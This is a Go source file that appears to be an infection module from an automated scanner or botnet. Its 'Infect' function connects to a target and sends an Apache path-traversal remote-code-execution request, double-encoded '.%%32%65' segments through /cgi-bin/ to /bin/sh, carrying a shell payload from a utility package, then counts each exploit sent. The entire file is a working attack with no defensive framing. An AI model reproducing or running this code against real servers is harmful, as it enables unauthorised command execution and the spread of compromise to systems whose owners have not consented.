package apache1

import (
	"fmt"
	"net"
	"scanner/components/utils"
	"time"
)

func Infect(Address string, Port int) {
	Conn, Err := net.Dial("tcp", fmt.Sprintf("%s:%d", Address, Port))
	if Err != nil {
		return
	}
	defer Conn.Close()

	Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	_, Err = Conn.Write([]byte(fmt.Sprintf("POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1\r\nHost: %s\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n(%s)\r\n\r\necho Content-Type: text/plain; echo; (%s)\r\n\r\n", Address, utils.GetShellPayload, utils.GetShellPayload)))

	if Err == nil {
		utils.ExploitSent++
	}
}
